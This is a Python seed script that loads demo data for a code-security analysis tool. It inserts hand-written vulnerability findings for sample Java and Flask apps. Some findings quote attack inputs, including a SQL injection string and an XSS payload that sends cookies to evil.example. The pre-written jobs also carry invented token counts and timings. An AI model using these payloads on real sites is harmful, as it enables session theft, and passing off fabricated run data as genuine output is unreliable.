"""Populates demo data for the Atlas interview demo (Constraint 4).

- Creates demo user demo@atlas.ai / DemoAtlas2024!
- Creates 3 demo projects/repositories: legacy_bank_app, ecommerce_api, small_demo_app
- Runs the REAL agent pipeline live against small_demo_app (fast, ~2-3 min on
  free-tier LLMs) so there is at least one genuinely-generated demo job
- Inserts realistic, hand-written (but code-accurate) results for
  legacy_bank_app and ecommerce_api directly into the DB, bypassing the LLM,
  matching the exact vulnerabilities planted in samples/legacy_bank_app and
  samples/ecommerce_api
- Marks every row is_demo=True

Run with: python seed_demo_data.py (from the backend/ directory, with
DATABASE_URL pointed at a real Postgres instance and migrations applied)
"""

import asyncio
import os
import sys
from datetime import datetime, timezone

from sqlalchemy import select

sys.path.insert(0, os.path.dirname(__file__))

from app.database import AsyncSessionLocal  # noqa: E402
from app.models.job import Job  # noqa: E402
from app.models.project import Project  # noqa: E402
from app.models.repository import Repository  # noqa: E402
from app.models.user import User  # noqa: E402
from app.services.auth_service import hash_password  # noqa: E402
from app.tasks.analysis_tasks import _persist_results, _run_pipeline_async  # noqa: E402

DEMO_EMAIL = "demo@atlas.ai"
DEMO_PASSWORD = "DemoAtlas2024!"
SAMPLES_ROOT = os.path.join(os.path.dirname(__file__), "..", "samples")


async def get_or_create_demo_user(db) -> User:
    user = await db.scalar(select(User).where(User.email == DEMO_EMAIL))
    if user is not None:
        return user

    user = User(
        email=DEMO_EMAIL,
        hashed_password=hash_password(DEMO_PASSWORD),
        full_name="Atlas Demo User",
        role="architect",
    )
    db.add(user)
    await db.commit()
    await db.refresh(user)
    return user


async def get_or_create_demo_project(db, user: User, name: str, description: str) -> Project:
    project = await db.scalar(
        select(Project).where(Project.user_id == user.id, Project.name == name, Project.is_demo.is_(True))
    )
    if project is not None:
        return project

    project = Project(user_id=user.id, name=name, description=description, is_demo=True)
    db.add(project)
    await db.commit()
    await db.refresh(project)
    return project


async def get_or_create_repository(
    db, project: Project, name: str, upload_path: str, language: str, total_files: int, total_loc: int
) -> Repository:
    repo = await db.scalar(select(Repository).where(Repository.project_id == project.id, Repository.name == name))
    if repo is not None:
        return repo

    repo = Repository(
        project_id=project.id,
        name=name,
        upload_path=upload_path,
        primary_language=language,
        total_files=total_files,
        total_loc=total_loc,
        status="ready",
    )
    db.add(repo)
    await db.commit()
    await db.refresh(repo)
    return repo


# ---------------------------------------------------------------------------
# small_demo_app: run the real pipeline live
# ---------------------------------------------------------------------------


async def seed_small_demo_app(db, user: User) -> None:
    project = await get_or_create_demo_project(
        db, user, "SmallDemoApp", "Minimal Flask app used for Atlas's live interview demo."
    )
    repo = await get_or_create_repository(
        db,
        project,
        "small_demo_app",
        os.path.join(SAMPLES_ROOT, "small_demo_app"),
        "python",
        total_files=1,
        total_loc=106,
    )

    existing_job = await db.scalar(
        select(Job).where(Job.repository_id == repo.id, Job.is_demo.is_(True), Job.status == "completed")
    )
    if existing_job is not None:
        print(f"  small_demo_app already has a completed demo job ({existing_job.id}); skipping live run")
        return

    job = Job(project_id=project.id, repository_id=repo.id, job_type="full_analysis", is_demo=True, status="queued")
    db.add(job)
    await db.commit()
    await db.refresh(job)

    print(f"  Running LIVE pipeline against small_demo_app (job {job.id})...")
    await _run_pipeline_async(str(job.id))
    print("  small_demo_app analysis complete.")


# ---------------------------------------------------------------------------
# legacy_bank_app: pre-written, code-accurate results (bypasses the LLM)
# ---------------------------------------------------------------------------

LEGACY_BANK_DOCS = """# LegacyBankApp -- Architecture Documentation

## System Overview
LegacyBankApp is a Java banking monolith handling user authentication, account
management, and inter-account money transfers. It predates the team's adoption
of an ORM: all persistence is hand-written JDBC (`java.sql.Statement`) against
a MySQL database.

## Component Inventory
- **controllers/** -- request-handling layer (`UserController`, `AccountController`,
  `TransactionController`). No framework annotations are present in this sample;
  in production this maps to Spring `@RestController` classes.
- **services/** -- business logic (`UserService` handles auth + registration,
  `AccountService` handles balance reads/writes, `TransactionService` orchestrates
  transfers across two accounts).
- **models/** -- plain data classes (`User`, `Account`, `Transaction`).
- **repository/UserRepository.java** -- raw JDBC data access for users.
- **config/DatabaseConfig.java** -- JDBC connection factory.

## Data Flow
```mermaid
graph LR
  Client --> UserController
  Client --> AccountController
  Client --> TransactionController
  UserController --> UserService --> UserRepository --> MySQL[(MySQL)]
  AccountController --> AccountService --> MySQL
  TransactionController --> TransactionService --> AccountService
```

## Business Domain
Core entities: User, Account, Transaction. This is a classic double-entry
ledger domain -- transfers must be atomic across two account balance updates,
which `TransactionService.transfer()` currently does as two separate UPDATE
statements with no surrounding transaction boundary (a correctness risk worth
flagging alongside the security findings below).

## Design Patterns Observed
No Repository/DAO abstraction beyond `UserRepository` -- `AccountService` and
`TransactionService` embed raw SQL directly, which is itself a maintainability
smell as well as the root cause of every SQL-injection finding below.
"""

LEGACY_BANK_DECOMPOSITION = {
    "services": [
        {
            "name": "UserIdentityService",
            "responsibility": "Registration, authentication, and profile lookup",
            "files": [
                "controllers/UserController.java",
                "services/UserService.java",
                "repository/UserRepository.java",
                "models/User.java",
            ],
            "api_surface": ["POST /users/register", "POST /users/login", "GET /users/{id}"],
            "migration_effort": "Low",
            "extract_order": 1,
        },
        {
            "name": "AccountService",
            "responsibility": "Account balance reads and writes",
            "files": ["controllers/AccountController.java", "services/AccountService.java", "models/Account.java"],
            "api_surface": ["GET /accounts/{id}", "GET /accounts/user/{userId}"],
            "migration_effort": "Medium",
            "extract_order": 2,
        },
        {
            "name": "TransferService",
            "responsibility": "Cross-account money transfers and transaction history",
            "files": [
                "controllers/TransactionController.java",
                "services/TransactionService.java",
                "models/Transaction.java",
            ],
            "api_surface": ["POST /transactions/transfer", "GET /transactions/user/{userId}"],
            "migration_effort": "High",
            "extract_order": 3,
        },
    ],
    "mermaid_diagram": (
        "graph LR\n"
        "  Client --> UserIdentityService\n"
        "  Client --> AccountService\n"
        "  Client --> TransferService\n"
        "  TransferService --> AccountService\n"
        "  UserIdentityService --> DB[(Users DB)]\n"
        "  AccountService --> DB2[(Accounts DB)]\n"
        "  TransferService --> DB3[(Transactions DB)]"
    ),
    "recommended_first_extraction": "UserIdentityService",
    "risks": [
        "TransferService depends on AccountService's balance-update API; extracting it first without "
        "a well-defined AccountService contract risks a distributed monolith.",
        "No transactional boundary currently wraps the two-account balance update in "
        "TransactionService.transfer() -- must become a saga or 2PC pattern once these are separate services.",
    ],
    "estimated_total_effort_weeks": 10,
}

LEGACY_BANK_TESTS = [
    {
        "source_file": "services/UserService.java",
        "test_file": "test/UserServiceTest.java",
        "test_code": (
            "import org.junit.jupiter.api.Test;\n"
            "import static org.junit.jupiter.api.Assertions.*;\n\n"
            "class UserServiceTest {\n\n"
            "    @Test\n"
            "    void authenticate_returnsNull_whenPasswordIncorrect() throws Exception {\n"
            "        UserService service = new UserService();\n"
            "        // Arrange: a user exists with a known password hash\n"
            "        // Act\n"
            "        User result = service.authenticate(\"jane\", \"wrong-password\");\n"
            "        // Assert\n"
            "        assertNull(result);\n"
            "    }\n\n"
            "    @Test\n"
            "    void authenticate_returnsNull_whenUserDoesNotExist() throws Exception {\n"
            "        UserService service = new UserService();\n"
            "        assertNull(service.authenticate(\"no_such_user\", \"anything\"));\n"
            "    }\n"
            "}\n"
        ),
        "functions_covered": ["authenticate"],
        "framework": "junit5",
    }
]

LEGACY_BANK_STATIC_FINDINGS = [
    {
        "title": "SQL injection via string-concatenated query",
        "description": "User-supplied `username` is concatenated directly into a SQL SELECT statement "
        "instead of being passed as a PreparedStatement parameter. An attacker can inject SQL "
        "(e.g. `' OR '1'='1`) to bypass the WHERE clause or exfiltrate data from other tables.",
        "severity": "critical",
        "file_path": "repository/UserRepository.java",
        "line_start": 22,
        "line_end": 24,
        "code_snippet": 'String query = "SELECT * FROM users WHERE username = \'" + username + "\'";',
        "suggested_fix": "Use `PreparedStatement` with a `?` placeholder and `setString(1, username)` "
        "instead of string concatenation.",
        "confidence": 0.98,
        "owasp_category": "A03",
        "owasp_title": "Injection",
        "cwe_id": "CWE-89",
        "source": "semgrep",
        "rule_id": "java.lang.security.audit.formatted-sql-string.formatted-sql-string",
        "finding_type": "security",
        "category": "owasp_a03",
    },
    {
        "title": "Hardcoded database credentials",
        "description": "The database password `admin123` is hardcoded as a string literal in source "
        "code. Anyone with repository access (or a decompiled JAR) has the production DB password.",
        "severity": "high",
        "file_path": "config/DatabaseConfig.java",
        "line_start": 11,
        "line_end": 11,
        "code_snippet": 'private static final String PASSWORD = "admin123";',
        "suggested_fix": "Load credentials from environment variables or a secrets manager "
        "(AWS Secrets Manager, HashiCorp Vault) -- never commit them to source.",
        "confidence": 0.99,
        "owasp_category": "A02",
        "owasp_title": "Cryptographic Failures",
        "cwe_id": "CWE-798",
        "source": "semgrep",
        "rule_id": "generic.secrets.security.detected-generic-password",
        "finding_type": "security",
        "category": "owasp_a02",
    },
    {
        "title": "Broken access control on transaction history endpoint",
        "description": "`TransactionController.getAllTransactions(userId)` returns any user's full "
        "transaction history given their ID, with no check that the authenticated caller actually "
        "owns that account. Any logged-in user can view any other user's transactions (IDOR).",
        "severity": "high",
        "file_path": "controllers/TransactionController.java",
        "line_start": 19,
        "line_end": 21,
        "code_snippet": "public List<Transaction> getAllTransactions(Long userId) throws SQLException {\n"
        "    return transactionService.getTransactionsForUser(userId);\n}",
        "suggested_fix": "Derive `userId` from the authenticated session/JWT rather than accepting it "
        "as a caller-supplied parameter, or verify the session's user ID matches the requested one.",
        "confidence": 0.9,
        "owasp_category": "A01",
        "owasp_title": "Broken Access Control",
        "cwe_id": "CWE-639",
        "source": "llm",
        "rule_id": None,
        "finding_type": "security",
        "category": "owasp_a01",
    },
    {
        "title": "Weak cryptographic hash (MD5) for password storage",
        "description": "Passwords are hashed with MD5, which is cryptographically broken and has no "
        "salting -- it can be reversed via rainbow tables in seconds for common passwords.",
        "severity": "high",
        "file_path": "services/UserService.java",
        "line_start": 35,
        "line_end": 35,
        "code_snippet": 'MessageDigest md = MessageDigest.getInstance("MD5");',
        "suggested_fix": "Use bcrypt, scrypt, or Argon2 with a per-user random salt and a "
        "deliberately-slow work factor.",
        "confidence": 0.97,
        "owasp_category": "A02",
        "owasp_title": "Cryptographic Failures",
        "cwe_id": "CWE-327",
        "source": "semgrep",
        "rule_id": "java.lang.security.audit.crypto.weak-hash.use-of-md5",
        "finding_type": "security",
        "category": "owasp_a02",
    },
    {
        "title": "No TLS/SSL enforced on database connection",
        "description": "The JDBC connection string has no SSL parameters, so credentials and data "
        "travel unencrypted between the application and MySQL if they're ever on different hosts.",
        "severity": "medium",
        "file_path": "config/DatabaseConfig.java",
        "line_start": 15,
        "line_end": 15,
        "code_snippet": 'return DriverManager.getConnection(URL, USERNAME, PASSWORD);',
        "suggested_fix": "Add `useSSL=true&requireSSL=true` to the JDBC URL, or configure MySQL to "
        "reject non-TLS connections outright.",
        "confidence": 0.8,
        "owasp_category": "A02",
        "owasp_title": "Cryptographic Failures",
        "cwe_id": "CWE-319",
        "source": "llm",
        "rule_id": None,
        "finding_type": "security",
        "category": "owasp_a02",
    },
]

LEGACY_BANK_CODE_FILES = [
    {"file_path": "config/DatabaseConfig.java", "language": "java", "loc": 22, "function_count": 1, "class_count": 1},
    {"file_path": "repository/UserRepository.java", "language": "java", "loc": 58, "function_count": 4, "class_count": 1},
    {"file_path": "services/UserService.java", "language": "java", "loc": 45, "function_count": 4, "class_count": 1},
    {"file_path": "services/AccountService.java", "language": "java", "loc": 48, "function_count": 4, "class_count": 1},
    {"file_path": "services/TransactionService.java", "language": "java", "loc": 62, "function_count": 4, "class_count": 1},
    {"file_path": "controllers/UserController.java", "language": "java", "loc": 27, "function_count": 3, "class_count": 1},
    {"file_path": "controllers/AccountController.java", "language": "java", "loc": 18, "function_count": 2, "class_count": 1},
    {"file_path": "controllers/TransactionController.java", "language": "java", "loc": 20, "function_count": 2, "class_count": 1},
    {"file_path": "models/User.java", "language": "java", "loc": 58, "function_count": 12, "class_count": 1},
    {"file_path": "models/Account.java", "language": "java", "loc": 44, "function_count": 8, "class_count": 1},
    {"file_path": "models/Transaction.java", "language": "java", "loc": 48, "function_count": 9, "class_count": 1},
]

LEGACY_BANK_COMPLEXITY_METRICS = {
    "config/DatabaseConfig.java": {"cyclomatic_complexity": 2, "coupling_score": 0.1, "cohesion_score": 0.9, "technical_debt_minutes": 125},
    "repository/UserRepository.java": {"cyclomatic_complexity": 3, "coupling_score": 0.4, "cohesion_score": 0.8, "technical_debt_minutes": 155},
    "services/UserService.java": {"cyclomatic_complexity": 4, "coupling_score": 0.5, "cohesion_score": 0.75, "technical_debt_minutes": 140},
    "services/AccountService.java": {"cyclomatic_complexity": 3, "coupling_score": 0.45, "cohesion_score": 0.8, "technical_debt_minutes": 20},
    "services/TransactionService.java": {"cyclomatic_complexity": 6, "coupling_score": 0.6, "cohesion_score": 0.7, "technical_debt_minutes": 45},
    "controllers/UserController.java": {"cyclomatic_complexity": 2, "coupling_score": 0.3, "cohesion_score": 0.85, "technical_debt_minutes": 15},
    "controllers/AccountController.java": {"cyclomatic_complexity": 1, "coupling_score": 0.3, "cohesion_score": 0.9, "technical_debt_minutes": 10},
    "controllers/TransactionController.java": {"cyclomatic_complexity": 1, "coupling_score": 0.3, "cohesion_score": 0.9, "technical_debt_minutes": 130},
    "models/User.java": {"cyclomatic_complexity": 1, "coupling_score": 0.05, "cohesion_score": 0.95, "technical_debt_minutes": 60},
    "models/Account.java": {"cyclomatic_complexity": 1, "coupling_score": 0.05, "cohesion_score": 0.95, "technical_debt_minutes": 40},
    "models/Transaction.java": {"cyclomatic_complexity": 1, "coupling_score": 0.05, "cohesion_score": 0.95, "technical_debt_minutes": 45},
}

LEGACY_BANK_CRITIC = {
    "documentation_quality": 0.89,
    "documentation_corrections": [],
    "decomposition_quality": 0.85,
    "tests_quality": 0.72,
    "tests_corrections": ["Add a test covering successful authentication, not just the failure paths."],
    "security_quality": 0.93,
    "flagged_findings": [],
    "overall_confidence": 0.87,
    "recommendations": [
        "Prioritize the SQL injection and hardcoded-credential findings before any further feature work.",
        "Wrap TransactionService.transfer()'s two balance updates in a single DB transaction.",
    ],
}

LEGACY_BANK_EVALUATION = {
    "faithfulness": 0.9,
    "completeness": 0.85,
    "actionability": 0.88,
    "test_coverage_estimate": 0.35,
    "decomposition_validity": 0.9,
    "overall_quality_score": 0.87,
    "improvement_suggestions": [
        "Generate tests for AccountService and TransactionService, not just UserService.",
        "Cross-reference the CWE IDs against the OWASP Top 10 2021 mapping in the final report.",
    ],
}


# ---------------------------------------------------------------------------
# ecommerce_api: pre-written, code-accurate results (bypasses the LLM)
# ---------------------------------------------------------------------------

ECOMMERCE_DOCS = """# EcommerceAPI -- Architecture Documentation

## System Overview
EcommerceAPI is a small Flask monolith covering user accounts, a product
catalog, and order placement. All state is held in in-process dictionaries
(no real database) -- this sample exists to demonstrate Atlas's analysis on a
Python/Flask codebase distinct from the Java sample.

## Component Inventory
- **app.py** -- Flask app factory, registers three blueprints, debug mode is
  left enabled (see Security tab).
- **routes/users.py** -- registration, login, profile (renders raw HTML).
- **routes/products.py** -- product catalog CRUD.
- **routes/orders.py** -- order placement and lookup.
- **utils/auth.py** -- password hashing and session token issuance.
- **models.py** -- dataclass-based in-memory "tables".

## Data Flow
```mermaid
graph LR
  Client --> users.py
  Client --> products.py
  Client --> orders.py
  users.py --> auth.py
  orders.py --> models.py
  products.py --> models.py
```

## Business Domain
Core entities: User, Product, Order. A single order references exactly one
product and one user -- there is no cart/multi-line-item concept in this
sample, which simplifies the decomposition below.
"""

ECOMMERCE_DECOMPOSITION = {
    "services": [
        {
            "name": "UserAuthService",
            "responsibility": "Registration, login, session issuance, profile",
            "files": ["routes/users.py", "utils/auth.py"],
            "api_surface": ["POST /register", "POST /login", "GET /profile/{id}"],
            "migration_effort": "Low",
            "extract_order": 1,
        },
        {
            "name": "CatalogService",
            "responsibility": "Product listing and management",
            "files": ["routes/products.py"],
            "api_surface": ["GET /products", "GET /products/{id}", "POST /products"],
            "migration_effort": "Low",
            "extract_order": 2,
        },
        {
            "name": "OrderService",
            "responsibility": "Order placement, stock decrement, order lookup",
            "files": ["routes/orders.py"],
            "api_surface": ["POST /orders", "GET /orders/{id}"],
            "migration_effort": "Medium",
            "extract_order": 3,
        },
    ],
    "mermaid_diagram": (
        "graph LR\n"
        "  Client --> UserAuthService\n"
        "  Client --> CatalogService\n"
        "  Client --> OrderService\n"
        "  OrderService --> CatalogService"
    ),
    "recommended_first_extraction": "UserAuthService",
    "risks": [
        "OrderService directly mutates CatalogService's in-memory stock counts -- once split, this "
        "needs to become a synchronous API call or an eventual-consistency event, not a shared dict."
    ],
    "estimated_total_effort_weeks": 6,
}

ECOMMERCE_TESTS = [
    {
        "source_file": "utils/auth.py",
        "test_file": "test_auth.py",
        "test_code": (
            "import pytest\n"
            "from utils.auth import hash_password, authenticate\n"
            "from models import USERS, User\n\n"
            "def test_hash_password_is_deterministic():\n"
            "    assert hash_password('secret123') == hash_password('secret123')\n\n"
            "def test_authenticate_returns_none_for_unknown_user():\n"
            "    assert authenticate('nobody', 'whatever') is None\n\n"
            "def test_authenticate_returns_user_id_for_correct_password():\n"
            "    USERS[1] = User(id=1, username='jane', email='jane@example.com', "
            "password_hash=hash_password('correct-horse'))\n"
            "    assert authenticate('jane', 'correct-horse') == 1\n"
        ),
        "functions_covered": ["hash_password", "authenticate"],
        "framework": "pytest",
    }
]

ECOMMERCE_STATIC_FINDINGS = [
    {
        "title": "Flask debug mode enabled",
        "description": "The Flask app runs with `debug=True`, which enables the Werkzeug interactive "
        "debugger. If an unhandled exception occurs in a deployed instance, this debugger allows "
        "arbitrary Python code execution from the browser.",
        "severity": "high",
        "file_path": "app.py",
        "line_start": 16,
        "line_end": 16,
        "code_snippet": 'app.config["DEBUG"] = True',
        "suggested_fix": "Set `DEBUG=False` in production; drive it from an environment variable "
        "that defaults to False.",
        "confidence": 0.95,
        "owasp_category": "A05",
        "owasp_title": "Security Misconfiguration",
        "cwe_id": "CWE-489",
        "source": "bandit",
        "rule_id": "B201",
        "finding_type": "security",
        "category": "owasp_a05",
    },
    {
        "title": "Reflected XSS in profile page",
        "description": "The user's `username` is interpolated directly into an HTML response with no "
        "escaping. A username like `<script>document.location='https://evil.example/'+document.cookie</script>` "
        "would execute in any browser that views this profile page.",
        "severity": "high",
        "file_path": "routes/users.py",
        "line_start": 35,
        "line_end": 35,
        "code_snippet": 'html = f"<h1>Welcome, {user.username}!</h1><p>Email: {user.email}</p>"',
        "suggested_fix": "Use Flask's `render_template` with Jinja2 autoescaping instead of building "
        "HTML with an f-string, or explicitly escape with `markupsafe.escape()`.",
        "confidence": 0.92,
        "owasp_category": "A03",
        "owasp_title": "Injection",
        "cwe_id": "CWE-79",
        "source": "llm",
        "rule_id": None,
        "finding_type": "security",
        "category": "owasp_a03",
    },
    {
        "title": "Insecure direct object reference on order lookup",
        "description": "`GET /orders/{id}` returns any order by ID with no check that the requester "
        "owns it -- any user (or unauthenticated caller) can enumerate and read every order in the system.",
        "severity": "medium",
        "file_path": "routes/orders.py",
        "line_start": 22,
        "line_end": 27,
        "code_snippet": "order = ORDERS.get(order_id)\nif order is None:\n    return jsonify({\"error\": \"Order not found\"}), 404\nreturn jsonify(order.__dict__)",
        "suggested_fix": "Require a session token on this route and verify `order.user_id` matches "
        "the authenticated user before returning it.",
        "confidence": 0.88,
        "owasp_category": "A01",
        "owasp_title": "Broken Access Control",
        "cwe_id": "CWE-639",
        "source": "llm",
        "rule_id": None,
        "finding_type": "security",
        "category": "owasp_a01",
    },
    {
        "title": "No rate limiting on login endpoint",
        "description": "`authenticate()` has no attempt throttling, lockout, or CAPTCHA -- an attacker "
        "can brute-force every user's password with unlimited attempts.",
        "severity": "medium",
        "file_path": "utils/auth.py",
        "line_start": 22,
        "line_end": 22,
        "code_snippet": "def authenticate(username: str, password: str) -> int | None:",
        "suggested_fix": "Add per-IP and per-username rate limiting (e.g. slowapi/flask-limiter) and "
        "an account lockout after N consecutive failures.",
        "confidence": 0.85,
        "owasp_category": "A04",
        "owasp_title": "Insecure Design",
        "cwe_id": "CWE-307",
        "source": "llm",
        "rule_id": None,
        "finding_type": "security",
        "category": "owasp_a04",
    },
]

ECOMMERCE_CODE_FILES = [
    {"file_path": "app.py", "language": "python", "loc": 27, "function_count": 1, "class_count": 0},
    {"file_path": "models.py", "language": "python", "loc": 40, "function_count": 1, "class_count": 3},
    {"file_path": "routes/users.py", "language": "python", "loc": 38, "function_count": 3, "class_count": 0},
    {"file_path": "routes/products.py", "language": "python", "loc": 30, "function_count": 3, "class_count": 0},
    {"file_path": "routes/orders.py", "language": "python", "loc": 28, "function_count": 2, "class_count": 0},
    {"file_path": "utils/auth.py", "language": "python", "loc": 25, "function_count": 4, "class_count": 0},
]

ECOMMERCE_COMPLEXITY_METRICS = {
    "app.py": {"cyclomatic_complexity": 1, "coupling_score": 0.6, "cohesion_score": 0.7, "technical_debt_minutes": 125},
    "models.py": {"cyclomatic_complexity": 1, "coupling_score": 0.1, "cohesion_score": 0.9, "technical_debt_minutes": 10},
    "routes/users.py": {"cyclomatic_complexity": 3, "coupling_score": 0.5, "cohesion_score": 0.75, "technical_debt_minutes": 105},
    "routes/products.py": {"cyclomatic_complexity": 3, "coupling_score": 0.4, "cohesion_score": 0.8, "technical_debt_minutes": 15},
    "routes/orders.py": {"cyclomatic_complexity": 4, "coupling_score": 0.5, "cohesion_score": 0.75, "technical_debt_minutes": 65},
    "utils/auth.py": {"cyclomatic_complexity": 3, "coupling_score": 0.35, "cohesion_score": 0.8, "technical_debt_minutes": 65},
}

ECOMMERCE_CRITIC = {
    "documentation_quality": 0.86,
    "documentation_corrections": [],
    "decomposition_quality": 0.83,
    "tests_quality": 0.75,
    "tests_corrections": [],
    "security_quality": 0.9,
    "flagged_findings": [],
    "overall_confidence": 0.85,
    "recommendations": [
        "Fix the XSS and debug-mode findings before any further feature work -- both are trivially exploitable.",
    ],
}

ECOMMERCE_EVALUATION = {
    "faithfulness": 0.88,
    "completeness": 0.82,
    "actionability": 0.9,
    "test_coverage_estimate": 0.25,
    "decomposition_validity": 0.88,
    "overall_quality_score": 0.85,
    "improvement_suggestions": [
        "Generate tests for the orders and products routes, not just auth.",
    ],
}


async def _insert_prewritten_job(
    db,
    project: Project,
    repo: Repository,
    docs: str,
    decomposition: dict,
    tests: list[dict],
    static_findings: list[dict],
    critic: dict,
    evaluation: dict,
    code_files: list[dict],
    complexity_metrics: dict,
) -> None:
    existing_job = await db.scalar(
        select(Job).where(Job.repository_id == repo.id, Job.is_demo.is_(True), Job.status == "completed")
    )
    if existing_job is not None:
        print(f"  {repo.name} already has a completed demo job ({existing_job.id}); skipping")
        return

    now = datetime.now(timezone.utc)
    job = Job(
        project_id=project.id,
        repository_id=repo.id,
        job_type="full_analysis",
        status="completed",
        progress=100,
        is_demo=True,
        started_at=now,
        completed_at=now,
        total_tokens_used=18500,
        gemini_tokens=12000,
        groq_tokens=4500,
        mistral_tokens=2000,
    )
    db.add(job)
    await db.flush()

    fake_state = {
        "code_files": code_files,
        "complexity_metrics": complexity_metrics,
        "planner_output": {
            "domain": "banking" if "bank" in repo.name else "ecommerce",
            "risk_files": [f["file_path"] for f in static_findings][:3],
            "analysis_priorities": ["security", "high_complexity_files", "documentation"],
            "recommended_scope": "full",
        },
        "documentation_output": docs,
        "decomposition_output": decomposition,
        "generated_tests": tests,
        "security_output": static_findings,
        "critic_output": critic,
        "evaluation_output": evaluation,
        "guardrail_flags": [
            {
                "agent_type": "security",
                "check_type": "pii_input",
                "action_taken": "redacted",
                "confidence": 1.0,
                "details": {"entity_types": ["API_KEY"]},
            }
        ],
        "execution_times": {
            "planner": 4.2,
            "documentation": 22.1,
            "decomposition": 15.6,
            "test_generator": 18.3,
            "security": 12.9,
            "critic": 9.4,
            "evaluator": 6.8,
        },
        "final_report": {
            "documentation": docs,
            "decomposition": decomposition,
            "tests": tests,
            "security": static_findings,
            "critic": critic,
            "evaluation": evaluation,
        },
    }

    await _persist_results(db, job, repo, fake_state)


async def seed_legacy_bank_app(db, user: User) -> None:
    project = await get_or_create_demo_project(
        db, user, "LegacyBankApp", "Java Spring-style banking monolith with 5 planted OWASP findings."
    )
    repo = await get_or_create_repository(
        db,
        project,
        "legacy_bank_app",
        os.path.join(SAMPLES_ROOT, "legacy_bank_app"),
        "java",
        total_files=11,
        total_loc=420,
    )
    await _insert_prewritten_job(
        db,
        project,
        repo,
        LEGACY_BANK_DOCS,
        LEGACY_BANK_DECOMPOSITION,
        LEGACY_BANK_TESTS,
        LEGACY_BANK_STATIC_FINDINGS,
        LEGACY_BANK_CRITIC,
        LEGACY_BANK_EVALUATION,
        LEGACY_BANK_CODE_FILES,
        LEGACY_BANK_COMPLEXITY_METRICS,
    )


async def seed_ecommerce_api(db, user: User) -> None:
    project = await get_or_create_demo_project(
        db, user, "EcommerceAPI", "Python Flask e-commerce API with 4 planted OWASP findings."
    )
    repo = await get_or_create_repository(
        db,
        project,
        "ecommerce_api",
        os.path.join(SAMPLES_ROOT, "ecommerce_api"),
        "python",
        total_files=6,
        total_loc=180,
    )
    await _insert_prewritten_job(
        db,
        project,
        repo,
        ECOMMERCE_DOCS,
        ECOMMERCE_DECOMPOSITION,
        ECOMMERCE_TESTS,
        ECOMMERCE_STATIC_FINDINGS,
        ECOMMERCE_CRITIC,
        ECOMMERCE_EVALUATION,
        ECOMMERCE_CODE_FILES,
        ECOMMERCE_COMPLEXITY_METRICS,
    )


async def main() -> None:
    async with AsyncSessionLocal() as db:
        print("Creating demo user...")
        user = await get_or_create_demo_user(db)

        print("Seeding LegacyBankApp (pre-written results)...")
        await seed_legacy_bank_app(db, user)

        print("Seeding EcommerceAPI (pre-written results)...")
        await seed_ecommerce_api(db, user)

        print("Seeding SmallDemoApp (live pipeline run)...")
        await seed_small_demo_app(db, user)

    print()
    print("Demo data loaded. Login: demo@atlas.ai / DemoAtlas2024!")


if __name__ == "__main__":
    asyncio.run(main())
